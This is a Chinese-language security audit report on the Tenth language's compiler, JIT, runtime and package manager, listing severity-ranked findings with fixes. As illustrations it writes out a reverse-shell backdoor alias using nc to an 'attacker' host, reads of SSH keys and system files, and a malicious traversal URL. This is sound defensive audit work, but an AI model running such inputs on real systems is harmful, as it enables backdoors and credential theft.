# Tenth 语言项目安全审查报告

> **审查日期**：2026-06-29
> **审查范围**：`tenth/`（Rust 主编译器 + 运行时）、`tenthc/`（自举源码）、`tenth/tools/tenthpm`、`tenth/tools/lsp`、构建配置、`SECURITY.md` / `AUDIT.md` 现有安全声明
> **审查员立场**：最严谨的安全员视角
> **审查方法**：静态代码审计 + 配置审计 + 文档一致性核查
> **审查依据**：Rust 通用安全最佳实践、通用软件安全原则（`security-best-practices` skill 的 Rust 专用参考文档不存在，已在审查前明示）
> **代码引用**：所有行号基于审查时磁盘状态，使用 `file:///` 协议可点击跳转

---

## 执行摘要（Executive Summary）

本次审查共发现 **25 项安全问题**，分布如下：

| 严重度 | 数量 | 概述 |
|--------|------|------|
| 🔴 致命（Critical） | 2 | tenthpm 包名注入导致的路径穿越 / 任意目录删除；`SECURITY.md` 严重失实声明掩盖真实攻击面 |
| 🟠 高危（High） | 8 | JIT `unsafe` 路径缺乏边界校验；文件 I/O 零沙箱；内存/CPU 限制默认关闭；JSON 解析栈溢出与转义缺陷；可预测随机数 |
| 🟡 中等（Medium） | 8 | `transmute` 函数指针、WASM 宿主越界 panic、`mem-strict` 用 panic 而非错误、release profile 未硬化等 |
| 🟢 低危（Low） | 7 | 整数算术未检查、`extract_package_name` 接受 `..`、`DefaultHasher` 用法、Cargo profile 缺失等 |

**核心结论**：

1. **`SECURITY.md` 中"0 处 `unsafe`、内存安全由 Rust 保证、无内存泄漏"的声明与代码事实严重不符**。`tenth/src/compile/jit/` 下存在 41+ 处 `unsafe` 声明（[hostcalls.rs](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs)、[context.rs](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/context.rs)、[mod.rs](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/mod.rs)），包括 `std::mem::transmute` 函数指针、`std::slice::from_raw_parts` 原始指针切片构造、`std::ptr::write` 裸写。文档失实本身就是安全问题——它会让使用者、贡献者和下游审查者误判攻击面。

2. **Tenth 作为通用编程语言，缺少任何沙箱或权限模型**，且默认运行模式（`tenth run file.th`）不启用内存/CPU 限制。任何 `.th` 源文件都拥有宿主全部文件系统访问能力（读 `~/.ssh/id_rsa`、写 `~/.bashrc`、`remove_file` 任意路径）。对一门"为 AI 研究而生"且会运行示例代码（`Tenth实例/`）的语言，这是必须正视的设计层风险。

3. **包管理器 `tenthpm install/add` 存在可被构造利用的路径穿越漏洞**，恶意 git URL 可触发任意目录删除/覆盖。

4. **JIT 编译路径缺乏纵深防御**：`from_raw_parts(args_ptr, count)` 的 `count` 来自 JIT 生成代码，且多处 `count * 2` / `rows * cols` 未做溢出检查。

---

## 🔴 致命发现（Critical）

### C-1. tenthpm 包名注入 → 任意目录删除/覆盖

- **位置**：
  - [tenth/tools/tenthpm/src/commands/install.rs:177-185](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/install.rs#L177-L185) `extract_package_name`
  - [tenth/tools/tenthpm/src/commands/install.rs:99-103, 142-145](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/install.rs#L99-L145) `install_local` / `install_global`
  - [tenth/tools/tenthpm/src/commands/add.rs:17-25, 63-71](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/add.rs#L17-L71) `add_git_dependency`
- **影响**：恶意 git URL（如 `https://attacker.invalid/../..` 或 `https://attacker.invalid/..`）经 `extract_package_name` 解析后 `package_name = ".."`。随后：
  - `install_global` 中 `target_dir = global_dir.join("..") = ~/.tenth`，乃至 `~/.tenth/packages/../..` 多级穿越到 `$HOME`；接着执行 [`fs::remove_dir_all(&target_dir)`](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/install.rs#L144) **递归删除用户主目录**。
  - `install_local` 中 `target_dir = deps/..` = 项目根目录，可触发目录覆盖或后续 `copy_dir` 写入项目根。
- **触发条件**：用户运行 `tenthpm install <恶意URL>` 或 `tenthpm add <恶意URL>`。攻击者只需诱导用户安装一个看起来正常的包名即可。
- **修复建议**：
  1. 在 `extract_package_name` 中拒绝 `.`、`..`、含路径分隔符（`/`、`\`）、空字符串、Windows 保留名（`CON`、`PRN`、`NUL` 等）的包名。
  2. 在 `target_dir` 计算后用 `canonicalize` + `starts_with(canonical_deps_root)` 二次校验，确保目标始终位于 deps 根之内。
  3. `remove_dir_all` 前再次校验目标非系统目录、非空字符串、非 `~`。
  4. 对 git URL 加入协议白名单（建议默认仅 `https://`），并提供 `--allow-ssh`/`--allow-git` 显式开关。

### C-2. SECURITY.md 安全声明严重失实

- **位置**：[SECURITY.md:5, 25-34](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/SECURITY.md#L25-L34)
- **失实声明**："`unsafe` 代码块 **0 处**"、"内存泄漏 无 — Rust 所有权系统保证"、"内存护栏 `limits.rs` + `arena.rs` — 全局原子计数器 + 作用域回滚"、"项目仅依赖 Rust 解释器路径执行"。
- **事实**：
  - `tenth/src/compile/jit/hostcalls.rs` 含 36 个 `unsafe extern "C" fn`，使用 `std::slice::from_raw_parts`（[第 186, 198, 215, 220, 237, 297, 337 行](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L186)）、`std::ptr::write`（数十处）。
  - `tenth/src/compile/jit/context.rs:47` 执行 `std::mem::transmute(raw_ptr)` 将 `*const u8` 强转为函数指针。
  - `tenth/src/compile/jit/mod.rs:81` 执行 `unsafe { hostcalls::invoke_jit(...) }`，把 `&mut Vm` 转为 `*mut Vm` 裸指针传入 JIT 代码。
  - `main.rs` 的 `vm_execute` 默认走 `jit::run_jit(&mut vm, "main")`（[main.rs:194, 207](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L194)）——**JIT 是默认执行路径，不是"仅解释器"**。
- **影响**：文档失实导致：(1) 下游审查者依据错误前提评估风险；(2) 使用者误以为运行任意 `.th` 文件零成本信任；(3) `AUDIT.md §五` 也复用了这一错误声明。这是治理层面的安全缺陷。
- **修复建议**：立即更新 `SECURITY.md`，明确列出 JIT 路径的 `unsafe` 边界与威胁模型；同步修订 `AUDIT.md` 与 `MEMO.md` 中所有"0 unsafe"叙述。

---

## 🟠 高危发现（High）

### H-1. JIT hostcall `from_raw_parts` 缺乏边界与溢出校验

- **位置**：[tenth/src/compile/jit/hostcalls.rs:186, 198, 215, 220, 237, 297, 337](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L186)
- **问题**：多个 hostcall 直接执行 `std::slice::from_raw_parts(args_ptr, count as usize)`，且多处先做 `count as usize * 2`（[第 220, 237 行](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L220)）或 `(rows as usize) * (cols as usize)`（[第 336 行](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L336)）。
- **风险**：
  - 整数溢出：`count = usize::MAX/2 + 1` 时 `count * 2` 回绕为小值，`from_raw_parts` 按回绕后的小长度切片，但后续 `while i < flat.len()` 循环按原始 `count` 推进索引 → 越界读 → UB。
  - `args_ptr` 无非空校验；JIT 翻译器若有 bug 传入空指针或悬空指针，立即 UB。
  - 纵深防御缺失：即便翻译器当前不会生成恶意 `count`，攻击者可通过恶意 `.th` 源码触发翻译器边界情况，或未来翻译器修改引入缺陷。
- **修复建议**：
  1. 所有 `count`/`field_count`/`rows * cols` 用 `checked_mul` / `checked_add`，溢出时返回错误而非 UB。
  2. `args_ptr` 校验非空，并尽可能用 `NonNull`/`&[Value]` 替代裸指针（虽然 ABI 限制可能不允许，但应留校验代码）。
  3. 对 `count` 设上限（如 `<= 1 << 20`），超过返回错误。
  4. 给每个 hostcall 加 `// SAFETY:` 注释明确不变量。

### H-2. 文件 I/O 原生函数零沙箱、零白名单

- **位置**：
  - [main.rs:364-398, 787-907](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L364) `read_file`/`write_file`/`read_bytes`/`write_bytes`/`mkdir`/`list_dir`/`remove_file`/`copy_file`/`rename_file`/`path_*`
  - [interpreter.rs:3757-3942](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/runtime/interpreter.rs#L3757) 解释器侧同名原生函数
  - [wasm.rs:1731, 1741](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/wasm.rs#L1731) WASM 宿主导入 `write_file`/`read_file`
  - [wasmtime_host.rs:28-62](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/wasmtime_host.rs#L28) wasmtime 宿主侧
- **问题**：所有文件操作原生函数接受任意路径字符串，无任何路径规范化、根目录限制、符号链接解析或权限校验。
- **可达成攻击**：一个 `.th` 程序可：
  - `read_file("~/.ssh/id_rsa")` 读取私钥；
  - `read_file("/etc/passwd")` 读取系统文件；
  - `write_file("~/.bashrc", "alias sudo='sudo nc attacker 4444 -e /bin/sh'")` 持久化后门；
  - `remove_file("/home/user/重要文档.pdf")` 破坏数据；
  - `write_file("~/.ssh/authorized_keys", "<attacker_pubkey>")` 横向移动。
- **修复建议**：
  1. 引入 `--fs-root <dir>` 沙箱根选项，所有路径强制规范化后必须 `starts_with` 沙箱根。
  2. 拒绝符号链接逃逸（`canonicalize` 后再校验）。
  3. 提供 `--read-only` / `--no-fs` 模式给示例代码运行使用。
  4. 至少在文档中明确警告"运行未知 `.th` 文件等同于运行未知 Rust 程序"。

### H-3. 默认运行模式无内存限制，REPL 限制为可选项

- **位置**：
  - [main.rs:127-167](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L127) `run_file` 完全不调用 `run_repl_with_limits`
  - [main.rs:45-63](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L45) `--max-memory` 仅作用于 REPL
  - [limits.rs:8-9](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/runtime/limits.rs#L8) "In default (release) mode, limits are soft warnings only"
- **问题**：`tenth run untrusted.th` 没有任何内存护栏。即便用户加了 `--max-memory`，限制也是"soft warnings only"——只有启用 `mem-strict` feature（默认未启用）才硬性阻断。
- **可达成攻击**：`let x = tensor([[1.0; 10000]; 10000];` 或 `let v = Vec::new(); while true { v.push(tensor([[1.0; 1000]; 1000])); }` 即可触发 OOM，宿主进程被 kill。
- **修复建议**：
  1. `run_file` 默认应用 `MemoryConfig::default()`，与 REPL 一致。
  2. `mem-strict` 行为（硬错误）改为 release 默认；`mem-debug`（计数器）可选。
  3. 文档明示默认限制值与如何关闭。

### H-4. 无 CPU/时间限制，`while true {}` 即可 DoS

- **位置**：全项目无 `setrlimit`、无超时线程、无指令计数器
- **问题**：解释器、VM、JIT 均无任何执行步数或墙钟超时。一个 `while true {}` 即可永久挂起宿主进程。
- **修复建议**：VM 字节码循环每 N 条指令检查超时；解释器在每个语句节点检查；JIT 在 backedge 插入计数器（标准 JIT 中断技术）。提供 `--timeout <secs>` 选项。

### H-5. `time_sleep_ms` 接受负数，wrap 为巨大 u64

- **位置**：[main.rs:465-472](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L465)
- **代码**：`std::thread::sleep(Duration::from_millis(*ms as u64))` —— `ms: i64`，若为 `-1`，`as u64` 得 `u64::MAX`，`Duration::from_millis(u64::MAX)` ≈ 4.9 亿年。
- **影响**：单行 `.th` 代码即可让进程睡眠近乎永久（DoS）。
- **修复建议**：`if *ms < 0 { return Err(...) }`；并设上限（如 24 小时）。

### H-6. 手写 JSON 解析器无深度限制，存在栈溢出 DoS

- **位置**：[main.rs:289-356](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L289) `json_decode_string` 递归 + `simple_json_split`
- **问题**：
  1. `json_decode_string` 对 `[[[...` 递归调用自身，无深度限制。`build.rs` 把栈扩到 64 MiB（[/STACK:67108864](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/build.rs)）只是掩盖问题——攻击者构造几千层嵌套仍可爆栈。
  2. `simple_json_split` 的 `in_string` 状态机不识别反斜杠转义：`"a\"b"` 中的 `\"` 会被误认为字符串结束，导致后续 `,` 被当作分隔符，解析结果错误（数据完整性问题）。
  3. 不支持 `\uXXXX`、控制字符校验。
- **修复建议**：用 `serde_json`（已是 tenthpm/lsp 依赖，主 crate 也可加入）替换手写解析器；或至少加深度计数器（> 256 拒绝）、修正转义状态机。

### H-7. `random_int`/`random_float` 使用可预测种子

- **位置**：[main.rs:474-506](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L474)
- **代码**：`DefaultHasher::new()` + `SystemTime::now().as_nanos().hash(&mut hasher)`。
- **问题**：
  - `DefaultHasher` 使用固定密钥的 SipHash（**非加密安全**，且密钥固定）。
  - 唯一熵源是系统时间纳秒——攻击者知道大致运行时刻即可枚举预测输出。
  - 同一纳秒内多次调用产生相同结果。
  - 项目已经依赖 `rand` 0.8（[Cargo.toml:19](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/Cargo.toml#L19)），且 `randn`/`randn_f32`（[main.rs:908-933](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L908)）正确使用 `rand::thread_rng()`——不一致表明 `random_int`/`random_float` 是疏忽。
- **影响**：若 `.th` 程序用 `random_int` 生成会话令牌、ID、密钥，可被预测。
- **修复建议**：统一改用 `rand::thread_rng()`；若需确定性种子，提供显式 `--seed` 选项，与默认 CSPRNG 分离。

### H-8. WASM/wasmtime 宿主用 `i32` 指针做切片索引，可越界 panic

- **位置**：
  - [wasmtime_host.rs:23-24, 33-34, 44-45, 70-71](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/wasmtime_host.rs#L23) 多处 `data[ptr as usize..]`、`data[ptr as usize..ptr as usize + end]`
  - [wasm.rs](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/wasm.rs) 同模式
- **问题**：`ptr: i32`，若 WASM 模块传入负数（如 `-1`），`ptr as usize` 在 64-bit 上因符号扩展得到 `0xFFFFFFFF_FFFFFFFF`，切片索引立即 panic（非 UB，但宿主进程崩溃）。若 `ptr > data.len()`，同样 panic。
- **影响**：恶意或 buggy WASM 模块可让 wasmi/wasmtime 宿主进程崩溃。WASM 模块来自 `compile_host` 编译 `.th` 源码，因此 `.th` 源码可触发。
- **修复建议**：所有 `ptr as usize` 前先 `let p = ptr as usize; if p >= data.len() { return 0; }`；`ptr + end` 也要 `checked_add` + 长度校验。

---

## 🟡 中等发现（Medium）

### M-1. `std::mem::transmute` 函数指针缺乏独立审计

- **位置**：[tenth/src/compile/jit/context.rs:47](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/context.rs#L47)
- **代码**：`let ptr: JitFn = unsafe { std::mem::transmute(raw_ptr) };`
- **问题**：`transmute` 是 Rust 中最危险的 API 之一。安全注释仅断言"我们声明的签名与翻译器一致"，但翻译器 [`translator.rs`](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/translator.rs) 任何破坏签名约定的修改都会变成静默 UB。
- **修复建议**：用 `core::mem::transmute_copy` + 显式尺寸断言；或用 `extern "C" fn` 类型的安全转换路径；为翻译器加单元测试断言函数签名与 `JitFn` 一致。

### M-2. `mem-strict` 用 `panic!` 而非错误返回

- **位置**：[repl.rs:239](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/repl.rs#L239) `panic!("definition limit exceeded: {}", msg);`
- **问题**：长会话 REPL 中触达限制时 `panic!` 会杀掉整个进程，丢失用户所有未保存工作。`mem-strict` 设计目的应是"硬阻断此次操作"，而非"杀进程"。
- **修复建议**：返回 `TenthError`，由 REPL 顶层 catch 并打印，保持会话存活。

### M-3. release profile 未硬化

- **位置**：[tenth/Cargo.toml](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/Cargo.toml) 无 `[profile.release]` 段
- **问题**：默认 release profile：`overflow-checks = false`、`panic = "unwind"`、`debug-assertions = false`。对一门处理不可信输入的语言运行时，缺少 `overflow-checks = true` 让 [hostcalls.rs:336](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L336) 这类 `rows * cols` 的溢出更难被发现。
- **修复建议**：
  ```toml
  [profile.release]
  overflow-checks = true
  # 也可考虑 panic = "abort" 以缩小 JIT 攻击面（但需评估对 catch_unwind 的影响）
  ```

### M-4. `host_make_tensor` 整数溢出

- **位置**：[hostcalls.rs:336](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/hostcalls.rs#L336)
- **代码**：`let count = (rows as usize) * (cols as usize);`
- **问题**：`rows = u64::MAX, cols = 2` → 溢出回绕为 `u64::MAX * 2 mod 2^64 = u64::MAX - 1`，仍是巨大数；接着 `from_raw_parts(args_ptr, count)` 触发巨大分配或越界读。
- **修复建议**：`rows.checked_mul(cols).ok_or("tensor too large")?`，并对照 `limits.rs::max_tensor_elements`。

### M-5. JIT `JitContext::Drop` 空实现附可疑注释

- **位置**：[context.rs:53-58](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/context.rs#L53)
- **问题**：注释 "JITModule doesn't expose a public finish; rely on Drop." 表明作者对释放路径不确定。`JITModule::finish` 实际存在（`Module::finish`），可显式释放代码映射。空 Drop 依赖隐式行为，若未来 cranelift 改变 Drop 语义，可能造成代码映射泄漏。
- **修复建议**：显式调用 `module.finish()` 或在 Drop 中 `let _ = self.module.finish();`，并加测试验证无内存增长。

### M-6. `vm as *mut Vm` 裸指针逃逸到 JIT 代码

- **位置**：[jit/mod.rs:81](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/jit/mod.rs#L81)
- **问题**：`&mut Vm` 转裸指针传给 JIT 函数。安全前提是：(1) JIT 期间 `Vm` 不被移动；(2) JIT 代码不持有指针越过 `invoke_jit` 调用；(3) 不发生 panic/unwind。前两条由 `&mut` 借用保证，但 (3) 不保证——若 hostcall 内部代码 panic，unwind 跨 FFI 边界是 UB（Rust 默认 `panic=unwind`）。
- **修复建议**：所有 hostcall 用 `catch_unwind` 包裹，或编译时强制 `panic=abort`；或在 `JitFn` 调用处包 `catch_unwind`。

### M-7. `Arena::alloc` / `scope` 无 checked 算术

- **位置**：[arena.rs:41, 89](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/runtime/arena.rs#L41)
- **代码**：`start + count`、`self.tracked_bytes - saved_tracked`
- **问题**：32-bit 平台 `start + count` 可溢出（64-bit 实际风险低）；`scope` 内若闭包误调 `dec_arena_bytes` 使 `tracked_bytes` 小于 `saved_tracked`，减法下溢 panic。
- **修复建议**：`checked_add`、`checked_sub` + 显式错误处理。

### M-8. WASM 宿主 `tenth_alloc` 的内存增长逻辑

- **位置**：[wasmtime_host.rs:117+](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/compile/wasmtime_host.rs#L117)（已读片段）、`wasm.rs` 同模式
- **问题**：bump 分配器 `*caller.data_mut() = bump + needed`，若 `needed` 来自 WASM 模块（`size: i32`），负数 `size` 转 `usize` 得巨大值，可触发巨大 `grow`，或回绕后写入任意偏移。
- **修复建议**：`size` 校验 `>= 0` 且 `<= 某上限`；`grow` 失败时返回错误而非静默 `ok()`。

---

## 🟢 低危发现（Low）

### L-1. `extract_package_name` 接受 `..`、空串、含 `/` 字符

- **位置**：[install.rs:177-185](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/install.rs#L177)、[add.rs:17-25](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/add.rs#L17)
- 是 C-1 的根因，单独列出以提示独立修复点。

### L-2. `DefaultHasher` 用于"随机数"

- **位置**：[main.rs:483-505](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L483)
- 已在 H-7 描述，列为低危是因为 Tenth 主要场景非安全敏感；但若被用于生成 ID/令牌则升级。

### L-3. `days_to_date` 整数算术无溢出检查

- **位置**：[main.rs:218-230](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L218)
- 输入来自 `SystemTime`，攻击者难以控制；但 `days + 719468` 等运算无 `checked_*`，理论上远期会溢出。

### L-4. git URL 接受 `ssh://` 协议

- **位置**：[install.rs:169-175](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/install.rs#L169)、[add.rs:8-14](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/tools/tenthpm/src/commands/add.rs#L8)
- `ssh://` URL 在启用了 agent forwarding 的环境中可能被恶意服务器利用进行 ssh agent 滥用。默认应仅 `https://`。

### L-5. git 仓库克隆后未禁用 hooks

- **位置**：所有 `Command::new("git").args(["clone", ...])` 调用
- 现代 git（≥2.20）默认不运行克隆来源仓库的 hooks（`core.hooksPath` 不被克隆仓库的 config 覆盖），但子模块克隆、`submodule.update` 配置可能仍触发。建议加 `--config protocol.file.allow=deny` 与 `--config protocol.git.allow=deny`，并在克隆后立即 `git -C <dir> config --local core.hooksPath /dev/null`。

### L-6. Cargo.lock 主 crate 已存在，但工具 crate lock 文件版本漂移需监控

- **位置**：`tenth/Cargo.lock`、`tenth/tools/tenthpm/Cargo.lock`、`tenth/tools/lsp/Cargo.lock`
- 三个独立 Cargo.lock，无统一锁。依赖版本漂移可能引入供应链风险。建议 CI 加 `cargo audit` 与 `cargo deny`。

### L-7. `compile_host` / `compile_program` 原生函数写文件无校验

- **位置**：[main.rs:642-667, 1061-1089](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/main.rs#L642)、[interpreter.rs:3945+](file:///d:/史蒂夫/Desktop/AI开发新语言：头脑风暴与评估/tenth/src/runtime/interpreter.rs#L3945)
- 接受任意输出路径并写 WASM 字节，与 H-2 同源，但限制在编译场景，单独列为低危。

---

## 其他观察（信息性，非漏洞）

- **O-1**：`SECURITY.md` 标注审查日期 2026-06-04，距今不足一月即发现重大事实错误，说明当时审查未含 `compile/jit/` 模块。建议建立"安全声明变更必经代码扫描"流程。
- **O-2**：`AUDIT.md §六 已知限制` 与 `SECURITY.md` 矛盾——AUDIT 提到 WASM/JIT 后端存在，SECURITY 却说"仅解释器"。两份文档需统一。
- **O-3**：`build.rs` 把栈扩到 64 MiB 掩盖了 H-6 的递归栈溢出，应作为 H-6 的"症状治疗"删除而非保留。
- **O-4**：`.reasonix/` 目录含 Python 脚本（`check_trae.py` 等），与项目主流程无关但未在 `.gitignore` 中明确处理。若为开发辅助工具应移至 `tools/dev/` 并加文档；若为遗留应清理。
- **O-5**：`dist/install.bat`、`dist/tenth.bat` 未审查（不在 src 树），建议独立审查安装脚本路径处理。

---

## 修复优先级建议

| 顺序 | ID | 理由 |
|------|----|------|
| 1 | C-1 | 可被远程诱导触发，造成不可恢复的用户数据丢失 |
| 2 | C-2 | 文档失实是其他风险被忽视的根源，先纠正认知 |
| 3 | H-2 | 设计层风险，需产品决策（沙箱模型），但可先加 `--fs-root` 临时缓解 |
| 4 | H-3, H-4 | DoS 是日常运行最易触发的攻击 |
| 5 | H-5 | 单行代码 DoS，修复成本极低 |
| 6 | H-1 | 纵深防御，配合 H-3 一起做 |
| 7 | H-6, H-7 | 数据完整性与可预测性 |
| 8 | H-8 | WASM 路径越界 panic |
| 9 | M-* | 系统性加固 |
| 10 | L-* | 长期改进 |

---

## 验证与后续

本报告所有结论均基于审查时的磁盘代码状态。建议：

1. 对 C-1 编写 PoC：构造 `https://attacker.invalid/..` URL，在隔离环境中验证 `install_global` 是否删除 `~/.tenth`。
2. 对 H-1 编写 fuzz 测试：随机生成字节码 chunk 喂入 JIT，监测 sanitizer 报警。
3. 对 H-3、H-4 编写回归测试：恶意 `.th` 文件应被拒绝而非拖垮宿主。
4. 修复后更新 `SECURITY.md`、`AUDIT.md`、`MEMO.md`，并加 `cargo audit` 到 CI。

---

*报告生成于 2026-06-29，由静态审计得出。建议结合动态 fuzzing 与 penetration testing 进一步验证。*
